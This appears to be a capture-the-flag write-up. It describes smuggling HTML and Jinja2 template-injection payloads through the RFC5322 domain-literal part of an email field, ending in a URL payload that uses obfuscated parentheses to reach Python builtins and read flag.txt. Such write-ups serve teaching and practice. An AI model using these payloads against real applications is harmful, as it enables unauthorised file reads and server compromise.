<h1>Deafcon</h1>

<p>The premise of this challenge was similar to <a href="hacker-ts.md">Hacker TS</a> - we had input that was rendered into a PDF using <code>wkhtmltopdf</code>. However, our payload had to fit the following constraints:</p>

<ul>
<li><code>name</code> validated for alphanumeric characters</li>
<li><code>email</code> uses RFC5322 validation</li>
</ul>

<p>The <code>email</code> parameter is naturally more realistic to exploit, so I dived into <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.4.1">RFC5322</a> and found the part that specified the allowed characters.</p>

<p>```
   addr-spec       =   local-part "@" domain</p>

<p>local-part      =   dot-atom / quoted-string / obs-local-part</p>

<p>domain          =   dot-atom / domain-literal / obs-domain</p>

<p>domain-literal  =   [CFWS] "[" *([FWS] dtext) [FWS] "]" [CFWS]</p>

<p>dtext           =   %d33-90 /          ; Printable US-ASCII
                       %d94-126 /         ;  characters not including
                       obs-dtext          ;  "[", "]", or "\"
```</p>

<p>The <code>email</code> is made up of <code>&lt;local-part</code>&gt;<code>@&lt;domain&gt;</code>, and interestingly the <code>domain</code> allows for a <code>domain-literal</code> format - <code>[&lt;any printable ASCII character&gt;]</code>.&#x20;</p>

<p>This allows us, for example, to use the following payload:</p>

<p><code>http://challenge.nahamcon.com:31575/ticket?name=test&amp;email=test@[&lt;h1&gt;test&lt;/h1&gt;]</code></p>

<p>My teammate Enyei then found that this endpoint was also vulnerable to SSTI - it seems that the input is first rendered into a Jinja2 template before being passed to <code>wkhtmltopdf</code>.&#x20;</p>

<p>The following will render the email as <code>test@[49]</code>, for instance:</p>

<p><code>http://challenge.nahamcon.com:31575/ticket?name=test&amp;email=test@[{{7*7}}]</code></p>

<p>At this point, we can craft a payload that reads the <code>flag.txt</code> file:</p>

<p><code>http://challenge.nahamcon.com:30555/ticket?name=a&amp;email=a@[{{%20get_flashed_messages.__globals__.__builtins__.open%EF%BC%88%22flag.txt%22%EF%BC%89.read%EF%BC%88%EF%BC%89%20}}]</code></p>
